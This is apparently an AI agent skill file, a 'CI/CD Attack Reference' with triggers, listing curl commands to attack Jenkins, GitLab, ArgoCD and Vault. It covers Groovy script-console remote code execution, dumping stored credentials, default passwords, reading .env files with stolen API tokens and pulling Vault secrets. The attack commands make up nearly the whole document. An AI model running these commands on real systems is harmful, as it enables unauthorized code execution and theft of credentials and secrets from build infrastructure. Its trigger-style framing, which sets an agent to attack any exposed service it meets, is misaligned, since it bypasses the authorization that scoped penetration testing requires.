---
name: svc-cicd
description: CI/CD & dev-infra attack techniques — credential exposure, RCE (script console / build), pipeline abuse, secret stores. Use when a CI/CD or SCM service is exposed. Triggers - Jenkins /job/ or script console, GitLab, ArgoCD, TeamCity, Gitea, Drone, exposed .git, runner token, pipeline.
---

# CI/CD Attack Reference

## Jenkins (8080/8443)
```bash
# Unauthenticated access
curl http://<target>:8080/
curl http://<target>:8080/script       # Groovy console (= RCE)
curl http://<target>:8080/asyncPeople/ # user enumeration

# Groovy console RCE
curl -d 'script=println+"id".execute().text' http://<target>:8080/script

# Credentials extraction (authenticated)
curl http://<target>:8080/credentials/
# Groovy: com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each{println it}

# Default credentials: admin/admin, admin/password, admin/jenkins

# Build history for secrets in logs
curl http://<target>:8080/job/<name>/lastBuild/console
```

## GitLab (80/443)
```bash
# Version detection
curl -s http://<target>/api/v4/version

# CVE-2021-22205: RCE via image upload (GitLab 11.9-13.10.3)
# CVE-2023-7028: Account takeover via password reset

# Public repos/snippets
curl http://<target>/explore/projects
curl http://<target>/explore/snippets

# API token abuse (if found)
curl -H "PRIVATE-TOKEN: <token>" http://<target>/api/v4/projects?membership=true
curl -H "PRIVATE-TOKEN: <token>" http://<target>/api/v4/projects/<id>/repository/files/.env/raw?ref=main
```

## ArgoCD (8080/443)
```bash
# Default credentials: admin / <pod-name>
# Or admin / argocd-server-<hash>

# API access
curl -k https://<target>/api/v1/session -d '{"username":"admin","password":"<pass>"}'
curl -k -H "Authorization: Bearer <token>" https://<target>/api/v1/applications
```

## Vault (8200)
```bash
# Check for unsealed vault
curl http://<target>:8200/v1/sys/health
curl http://<target>:8200/v1/sys/seal-status

# If root token found
curl -H "X-Vault-Token: <token>" http://<target>:8200/v1/secret/data/
```

## General CI/CD Checks
- Search for `.env`, `docker-compose.yml`, `Jenkinsfile`, `.gitlab-ci.yml` in repos
- Pipeline logs often contain secrets in plaintext
- Service account tokens in pods/containers
- Registry credentials (Docker Hub, ECR, GCR)
